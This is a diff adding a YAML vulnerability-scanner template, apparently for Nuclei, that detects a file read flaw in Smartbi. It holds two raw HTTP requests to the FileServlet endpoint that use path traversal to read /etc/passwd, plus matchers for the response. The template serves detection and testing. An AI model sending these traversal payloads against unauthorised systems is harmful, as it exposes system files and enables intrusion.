@@ -1,0 +1,34 @@
+id: smartbi-bireadfile-ct-649451
+info:
+  name: Smartbi File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template identifies a potential file read vulnerability in Smartbi by attempting to access the /etc/passwd file.
+
+http:
+  - raw:
+      - |
+        GET /vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
+
+  - raw:
+      - |
+        GET /smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
